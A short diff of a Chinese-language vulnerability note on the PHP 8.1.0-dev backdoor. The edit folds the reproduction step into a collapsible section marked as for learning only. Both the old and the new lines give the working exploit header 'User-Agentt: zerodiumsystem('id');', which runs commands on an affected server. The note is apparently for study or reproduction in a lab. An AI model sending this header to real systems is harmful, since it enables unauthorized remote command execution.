@@ -27,15 +27,18 @@ PHP 8.1.0-dev
 
 ```
 "PHP/8.1.0-dev"
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 后门为添加请求头
 
 ```plain
-User-Agentt: zerodiumsystem('id');
-```
+User-Agentt: zerodium&#115;ystem('id');</code></pre>
+
+</details>
 
 - 是 User-Agentt 不是 User-Agent
 
